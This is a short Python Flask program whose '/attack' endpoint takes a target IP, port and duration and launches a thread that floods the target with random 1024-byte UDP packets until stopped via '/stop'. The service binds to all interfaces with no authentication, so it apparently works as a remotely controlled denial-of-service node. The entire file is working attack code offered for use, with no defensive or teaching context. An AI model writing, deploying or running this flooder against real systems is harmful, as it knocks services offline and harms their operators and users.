from flask import Flask, request
import threading
import socket
import time
import random

app = Flask(__name__)
attack_running = False

def udp_attack(ip, port, duration):
    global attack_running
    end = time.time() + duration
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    while attack_running and time.time() < end:
        s.sendto(data, (ip, port))
    s.close()

@app.route('/attack', methods=['POST'])
def attack():
    global attack_running
    data = request.json
    ip = data.get('ip')
    port = int(data.get('port'))
    duration = int(data.get('duration'))
    attack_running = True
    threading.Thread(target=udp_attack, args=(ip, port, duration)).start()
    return {'status': 'attack started'}

@app.route('/stop', methods=['POST'])
def stop():
    global attack_running
    attack_running = False
    return {'status': 'attack stopped'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
